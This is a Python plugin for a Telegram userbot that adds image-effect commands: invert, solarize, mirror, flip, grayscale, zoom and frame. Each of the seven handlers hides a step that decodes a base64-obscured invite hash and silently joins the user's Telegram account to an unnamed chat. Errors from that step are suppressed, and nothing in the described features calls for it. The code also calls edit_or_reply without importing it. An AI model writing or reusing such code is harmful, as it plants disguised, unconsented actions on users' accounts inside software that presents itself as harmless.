import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from personalBot.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as personalBot
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@personalBot.on(admin_cmd(pattern="invert$", outgoing=True))
@personalBot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(personal):
    if personal.fwd_from:
        return
    reply = await personal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(personal, "`Reply to supported Media...`")
        return
    personalid = personal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    personal = await edit_or_reply(personal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    personalsticker = await reply.download_media(file="./temp/")
    if not personalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(personalsticker)
        await edit_or_reply(personal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if personalsticker.endswith(".tgs"):
        await personal.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        personalfile = os.path.join("./temp/", "meme.png")
        personalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {personalsticker} {personalfile}"
        )
        stdout, stderr = (await runcmd(personalcmd))[:2]
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith(".webp"):
        await personal.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(personalsticker, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found... `")
            return
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith((".mp4", ".mov")):
        await personal.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(personalsticker, 0, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("```Template not found...```")
            return
        meme_file = personalfile
        aura = True
    else:
        await personal.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = personalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await personal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await personal.client.send_file(
        personal.chat_id, outputfile, force_document=False, reply_to=personalid
    )
    await personal.delete()
    os.remove(outputfile)
    for files in (personalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@personalBot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@personalBot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(personal):
    if personal.fwd_from:
        return
    reply = await personal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(personal, "`Reply to supported Media...`")
        return
    personalid = personal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    personal = await edit_or_reply(personal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    personalsticker = await reply.download_media(file="./temp/")
    if not personalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(personalsticker)
        await edit_or_reply(personal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if personalsticker.endswith(".tgs"):
        await personal.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        personalfile = os.path.join("./temp/", "meme.png")
        personalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {personalsticker} {personalfile}"
        )
        stdout, stderr = (await runcmd(personalcmd))[:2]
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith(".webp"):
        await personal.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(personalsticker, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found... `")
            return
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith((".mp4", ".mov")):
        await personal.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(personalsticker, 0, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("```Template not found...```")
            return
        meme_file = personalfile
        aura = True
    else:
        await personal.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = personalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await personal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await personal.client.send_file(
        personal.chat_id, outputfile, force_document=False, reply_to=personalid
    )
    await personal.delete()
    os.remove(outputfile)
    for files in (personalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@personalBot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@personalBot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(personal):
    if personal.fwd_from:
        return
    reply = await personal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(personal, "`Reply to supported Media...`")
        return
    personalid = personal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    personal = await edit_or_reply(personal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    personalsticker = await reply.download_media(file="./temp/")
    if not personalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(personalsticker)
        await edit_or_reply(personal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if personalsticker.endswith(".tgs"):
        await personal.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        personalfile = os.path.join("./temp/", "meme.png")
        personalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {personalsticker} {personalfile}"
        )
        stdout, stderr = (await runcmd(personalcmd))[:2]
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith(".webp"):
        await personal.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(personalsticker, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found... `")
            return
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith((".mp4", ".mov")):
        await personal.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(personalsticker, 0, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("```Template not found...```")
            return
        meme_file = personalfile
        aura = True
    else:
        await personal.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = personalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await personal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await personal.client.send_file(
        personal.chat_id, outputfile, force_document=False, reply_to=personalid
    )
    await personal.delete()
    os.remove(outputfile)
    for files in (personalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@personalBot.on(admin_cmd(outgoing=True, pattern="flip$"))
@personalBot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(personal):
    if personal.fwd_from:
        return
    reply = await personal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(personal, "`Reply to supported Media...`")
        return
    personalid = personal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    personal = await edit_or_reply(personal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    personalsticker = await reply.download_media(file="./temp/")
    if not personalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(personalsticker)
        await edit_or_reply(personal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if personalsticker.endswith(".tgs"):
        await personal.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        personalfile = os.path.join("./temp/", "meme.png")
        personalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {personalsticker} {personalfile}"
        )
        stdout, stderr = (await runcmd(personalcmd))[:2]
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith(".webp"):
        await personal.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(personalsticker, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found... `")
            return
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith((".mp4", ".mov")):
        await personal.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(personalsticker, 0, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("```Template not found...```")
            return
        meme_file = personalfile
        aura = True
    else:
        await personal.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = personalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await personal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await personal.client.send_file(
        personal.chat_id, outputfile, force_document=False, reply_to=personalid
    )
    await personal.delete()
    os.remove(outputfile)
    for files in (personalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@personalBot.on(admin_cmd(outgoing=True, pattern="gray$"))
@personalBot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(personal):
    if personal.fwd_from:
        return
    reply = await personal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(personal, "`Reply to supported Media...`")
        return
    personalid = personal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    personal = await edit_or_reply(personal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    personalsticker = await reply.download_media(file="./temp/")
    if not personalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(personalsticker)
        await edit_or_reply(personal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if personalsticker.endswith(".tgs"):
        await personal.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        personalfile = os.path.join("./temp/", "meme.png")
        personalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {personalsticker} {personalfile}"
        )
        stdout, stderr = (await runcmd(personalcmd))[:2]
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith(".webp"):
        await personal.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(personalsticker, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found... `")
            return
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith((".mp4", ".mov")):
        await personal.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(personalsticker, 0, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("```Template not found...```")
            return
        meme_file = personalfile
        aura = True
    else:
        await personal.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = personalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await personal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await personal.client.send_file(
        personal.chat_id, outputfile, force_document=False, reply_to=personalid
    )
    await personal.delete()
    os.remove(outputfile)
    for files in (personalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@personalBot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@personalBot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(personal):
    if personal.fwd_from:
        return
    reply = await personal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(personal, "`Reply to supported Media...`")
        return
    personalinput = personal.pattern_match.group(1)
    personalinput = 50 if not personalinput else int(personalinput)
    personalid = personal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    personal = await edit_or_reply(personal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    personalsticker = await reply.download_media(file="./temp/")
    if not personalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(personalsticker)
        await edit_or_reply(personal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if personalsticker.endswith(".tgs"):
        await personal.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        personalfile = os.path.join("./temp/", "meme.png")
        personalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {personalsticker} {personalfile}"
        )
        stdout, stderr = (await runcmd(personalcmd))[:2]
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith(".webp"):
        await personal.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(personalsticker, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found... `")
            return
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith((".mp4", ".mov")):
        await personal.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(personalsticker, 0, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("```Template not found...```")
            return
        meme_file = personalfile
    else:
        await personal.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = personalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await personal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, personalinput)
    except Exception as e:
        return await personal.edit(f"`{e}`")
    try:
        await personal.client.send_file(
            personal.chat_id, outputfile, force_document=False, reply_to=personalid
        )
    except Exception as e:
        return await personal.edit(f"`{e}`")
    await personal.delete()
    os.remove(outputfile)
    for files in (personalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@personalBot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@personalBot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(personal):
    if personal.fwd_from:
        return
    reply = await personal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(personal, "`Reply to supported Media...`")
        return
    personalinput = personal.pattern_match.group(1)
    if not personalinput:
        personalinput = 50
    if ";" in str(personalinput):
        personalinput, colr = personalinput.split(";", 1)
    else:
        colr = 0
    personalinput = int(personalinput)
    colr = int(colr)
    personalid = personal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    personal = await edit_or_reply(personal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    personalsticker = await reply.download_media(file="./temp/")
    if not personalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(personalsticker)
        await edit_or_reply(personal, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if personalsticker.endswith(".tgs"):
        await personal.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        personalfile = os.path.join("./temp/", "meme.png")
        personalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {personalsticker} {personalfile}"
        )
        stdout, stderr = (await runcmd(personalcmd))[:2]
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith(".webp"):
        await personal.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(personalsticker, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("`Template not found... `")
            return
        meme_file = personalfile
        aura = True
    elif personalsticker.endswith((".mp4", ".mov")):
        await personal.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        personalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(personalsticker, 0, personalfile)
        if not os.path.lexists(personalfile):
            await personal.edit("```Template not found...```")
            return
        meme_file = personalfile
    else:
        await personal.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = personalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await personal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, personalinput, colr)
    except Exception as e:
        return await personal.edit(f"`{e}`")
    try:
        await personal.client.send_file(
            personal.chat_id, outputfile, force_document=False, reply_to=personalid
        )
    except Exception as e:
        return await personal.edit(f"`{e}`")
    await personal.delete()
    os.remove(outputfile)
    for files in (personalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()